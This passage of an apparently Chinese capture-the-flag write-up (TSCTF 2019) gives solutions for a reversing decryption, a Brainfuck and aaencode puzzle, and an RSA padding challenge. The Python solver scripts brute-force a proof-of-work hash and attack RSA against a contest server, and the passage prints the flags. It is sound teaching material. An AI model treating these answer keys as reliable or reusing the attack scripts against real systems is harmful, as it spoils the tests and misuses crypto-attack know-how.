class="string">'0x658021'</span>,<span class="string">'0x0032cf'</span>]</span><br><span class="line"></span><br><span class="line">decrypt=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">s=string.digits+string.ascii_letters+string.punctuation+string.whitespace</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x32CF</span></span><br><span class="line">n = <span class="number">0x658021</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(encrypt)):</span><br><span class="line">    <span class="keyword">for</span> chr <span class="keyword">in</span> s:</span><br><span class="line">        t = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(e):</span><br><span class="line">            t = t * ord(chr) % n</span><br><span class="line">        <span class="keyword">if</span> encrypt[i] == hex(t):</span><br><span class="line">            decrypt+=chr</span><br><span class="line"><span class="keyword">print</span> decrypt</span><br></pre></td></tr></table></figure>
+<p>flag:TSCTF{congr4tl4tions!-here-1s-y0r-gif-2019}</p>
+<h3 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h3><p>有没有发现flag似乎哪里不对？</p>
+<p>没错，它少了几个字符，应该是dump+处理encrypt字符串时搞丢了一些……</p>
+<p>TSCTF{congr4tul4tions!-here-1s-y0ur-gift-2019}</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><hr>
+<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello_World"></a>Hello_World</h2><p>附件是一个Hello_world.docx，打开发现没啥有用信息</p>
+<p>通过binwalk分析得到Flag.xml，里面有很多经过不同编码的字符串</p>
+<blockquote>
+<p>只要你能老老实实学会这些Hello world的写法，就一定能找到你想要的东西。</p>
+</blockquote>
+<p>第一段编码采用Brainfuck<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span> &gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span></span><br><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt; <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;<span class="title">]</span> &gt;<span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="string">.</span> &lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span> <span class="literal">-</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span></span><br><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> &lt;<span class="title">]</span>&gt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>&lt; <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span> &gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt; <span class="title">]</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span></span><br><span class="line"><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span>&gt; <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span> &gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> &lt;<span class="title">]</span>&gt;<span class="literal">-</span><span class="literal">-</span> <span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span> &lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span> <span class="literal">-</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span></span><br><span class="line">&lt;<span class="title">]</span>&gt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt; <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;<span class="title">]</span> &gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt; <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt; <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span>&gt;</span><br><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span> &lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span> <span class="literal">-</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> &lt;<span class="title">]</span>&gt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span> &lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span> &gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;<span class="title">]</span> &gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span></span><br><span class="line">&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span> <span class="literal">-</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> &lt;<span class="title">]</span>&gt;<span class="literal">+</span><span class="literal">+</span> <span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;<span class="title">]</span> &gt;<span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span>&gt;</span><br><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="string">.</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt; <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;<span class="title">]</span> &gt;<span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="string">.</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span></span><br><span class="line"><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="string">.</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span> <span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;</span><br></pre></td></tr></table></figure></p>
+<p>解密得到</p>
+<blockquote>
+<p><a href="https://www.zhihu.com/question/63387608" target="_blank" rel="noopener">https://www.zhihu.com/question/63387608</a></p>
+</blockquote>
+<p>访问某乎关于如何有格调地输出「Hello, World!」？</p>
+<p>第一个回答跟颜文字相关，正好题目待解码文件有颜文字，直接解码（颜文字是js的aacode 编码）</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   /<span class="comment">/*´∇｀*/</span> [<span class="string">'_'</span>]; o=(ﾟｰﾟ)  =<span class="symbol">_</span>=<span class="number">3</span>; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^<span class="symbol">_</span>^o)/ (o^<span class="symbol">_</span>^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: <span class="string">'_'</span> ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">'_'</span>) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟω ﾟﾉ+ <span class="string">'_'</span>)[o^<span class="symbol">_</span>^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">'_'</span>)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">'_'</span>) [c^<span class="symbol">_</span>^o];(ﾟДﾟ) [<span class="string">'c'</span>] = ((ﾟДﾟ)+<span class="string">'_'</span>) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [<span class="string">'o'</span>] = ((ﾟДﾟ)+<span class="string">'_'</span>) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [<span class="string">'c'</span>]+(ﾟДﾟ) [<span class="string">'o'</span>]+(ﾟωﾟﾉ +<span class="string">'_'</span>)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">'_'</span>) [ﾟｰﾟ] + ((ﾟДﾟ) +<span class="string">'_'</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">'_'</span>) [ﾟΘﾟ]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">'_'</span>) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [<span class="string">'c'</span>]+((ﾟДﾟ)+<span class="string">'_'</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [<span class="string">'o'</span>]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">'_'</span>) [ﾟΘﾟ];(ﾟДﾟ) [<span class="string">'_'</span>] =(o^<span class="symbol">_</span>^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">'_'</span>) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+<span class="string">'_'</span>) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">'_'</span>) [o^<span class="symbol">_</span>^o -ﾟΘﾟ]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">'_'</span>) [ﾟΘﾟ]+ (ﾟωﾟﾉ +<span class="string">'_'</span>) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=<span class="string">'\\'</span>; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^<span class="symbol">_</span>^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +<span class="string">'_'</span>)[c^<span class="symbol">_</span>^o];(ﾟДﾟ) [ﾟoﾟ]=<span class="string">'\"'</span>;(ﾟДﾟ) [<span class="string">'_'</span>] ( (ﾟДﾟ) [<span class="string">'_'</span>] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^<span class="symbol">_</span>^o) +(o^<span class="symbol">_</span>^o))+ ((o^<span class="symbol">_</span>^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^<span class="symbol">_</span>^o) +(o^<span class="symbol">_</span>^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^<span class="symbol">_</span>^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^<span class="symbol">_</span>^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^<span class="symbol">_</span>^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^<span class="symbol">_</span>^o) - (ﾟΘﾟ))+ (o^<span class="symbol">_</span>^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^<span class="symbol">_</span>^o)+ (o^<span class="symbol">_</span>^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^<span class="symbol">_</span>^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^<span class="symbol">_</span>^o)+ ((o^<span class="symbol">_</span>^o) +(o^<span class="symbol">_</span>^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^<span class="symbol">_</span>^o))+ (o^<span class="symbol">_</span>^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^<span class="symbol">_</span>^o) - (ﾟΘﾟ))+ (o^<span class="symbol">_</span>^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^<span class="symbol">_</span>^o) +(o^<span class="symbol">_</span>^o))+ ((o^<span class="symbol">_</span>^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^<span class="symbol">_</span>^o) +(o^<span class="symbol">_</span>^o))+ (o^<span class="symbol">_</span>^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^<span class="symbol">_</span>^o) +(o^<span class="symbol">_</span>^o))+ (o^<span class="symbol">_</span>^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^<span class="symbol">_</span>^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^<span class="symbol">_</span>^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (<span class="string">'_'</span>);</span><br></pre></td></tr></table></figure>
+<p>解得flag</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><hr>
+<h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><h3 id="sha256"><a href="#sha256" class="headerlink" title="sha256"></a>sha256</h3><p>nc 后给了一个等式，需要返回XXXX</p>
+<blockquote>
+<p>sha256(XXXX+xjy6K8LShIb3YImQ) == 7cc5a5080e99c4507d0f38badfe3496330cf6520eb09e81ee25344ee72bccdc4<br>Give me XXXX:</p>
+</blockquote>
+<p>sha256爆破四位字符解得</p>
+<h3 id="rsa-padding-attack"><a href="#rsa-padding-attack" class="headerlink" title="rsa padding attack"></a>rsa padding attack</h3><p>交互之后给了rsa的相关参数，输入padding后，明文是flag+padding，返回密文c的值<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">------</span><br><span class="line">args:</span><br><span class="line"><span class="code">    e = 3</span></span><br><span class="line"><span class="code">    n = 15140693307781575272905350127561480454925382248795401006625344434130151846159152971573000556723863453355181533147841646458143380103726586571049885350673144089829068009655419999239385581818120152814330978257677531674973337312840399216471492585834737174518293085143844527211526737653844651552314020009101138118532093970566042720563471752966826492765420192021844395106141004313477990385827147980290701501857295050930728740995972148940052482089846995233018778559881494686891833098312466976990249602655019736515270250381315543985877162881197770970391243217647571088328005066371951384078096064640638774932935204127654713461L</span></span><br><span class="line">code:</span><br><span class="line"><span class="code">    flag = bytes_to_long(FLAG)</span></span><br><span class="line"><span class="code">    padding = self.recv(1024).strip()</span></span><br><span class="line"><span class="code">    padding = int('0x'+padding, 16)</span></span><br><span class="line"><span class="code">    c = pow(flag + padding, e, n)</span></span><br><span class="line"><span class="code">    send(c)</span></span><br><span class="line">------</span><br><span class="line">Now give me the padding:</span><br><span class="line">Give me a padding please:</span><br></pre></td></tr></table></figure></p>
+<p>联想到padding攻击，交互两次得到两组padding和密文，可以解得flag</p>
+<blockquote>
+<p>参考:<a href="https://www.anquanke.com/post/id/158944#h2-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158944#h2-6</a></p>
+</blockquote>
+<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'TSCTF&#123;Zeg3_zege_w3b_d0wn_1e!&#125;'</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">'10.112.100.47'</span></span><br><span class="line">port = <span class="number">10919</span></span><br><span class="line"></span><br><span class="line">strs = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParms</span><span class="params">(data)</span>:</span></span><br><span class="line"></span><br><span class="line">    pattern=re.compile(<span class="string">r'sha256\(XXXX\+(.*)\) == (.*)'</span>)</span><br><span class="line">    <span class="comment">#pattern = re.compile(r'sha256(.*)')</span></span><br><span class="line"></span><br><span class="line">    res = re.findall(pattern, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> befSha,endSha <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Get befSha : '</span> + befSha</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Get endSha : '</span> + endSha</span><br><span class="line">        <span class="keyword">return</span> befSha,endSha</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getXXXX</span><span class="params">(data)</span>:</span></span><br><span class="line">    befSha, endSha = getParms(data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\nBegin decode XXXX.............'</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> strs:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> strs:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> strs:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> strs:</span><br><span class="line">                    <span class="comment">#tmp = chr(a) + chr(b) + chr(c) + chr(d)</span></span><br><span class="line"></span><br><span class="line">                    XXXX = a+b+c+d</span><br><span class="line">                    payload = XXXX +befSha</span><br><span class="line">                    <span class="keyword">if</span> (hashlib.sha256(payload).hexdigest()) == endSha:</span><br><span class="line">                        <span class="comment">#ret = []</span></span><br><span class="line">                        <span class="comment">#XXXX = a+b+c+d</span></span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'Get XXXX : '</span>+ XXXX+<span class="string">'\n'</span></span><br><span class="line">                        <span class="keyword">return</span> XXXX</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getN</span><span class="params">(padding)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line"></span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    data = data.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Recv data : \n'</span> + data  <span class="comment"># sha256(XXXX+shn2GbQy6SvVCfo6) == ffea37c634d2f0fe605bd888b894ade251c00edb100b021295fd8123d3dd4b5d</span></span><br><span class="line"></span><br><span class="line">    XXXX = getXXXX(data)</span><br><span class="line"></span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    data = data.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Recv data : \n'</span> + data  <span class="comment"># Give me X<span class="doctag">XXX:</span></span></span><br><span class="line">    s.send(XXXX)</span><br><span class="line"></span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    data = data.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Recv data : \n'</span> + data  <span class="comment"># Now give me the padding:</span></span><br><span class="line"></span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    data = data.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Recv data : \n'</span> + data  <span class="comment"># Give me a padding please:</span></span><br><span class="line"></span><br><span class="line">    p = str(padding)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Send padding : '</span> + p</span><br><span class="line">    s.send(p)</span><br><span class="line"></span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    data = data.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Recv data : \n'</span> + data</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span 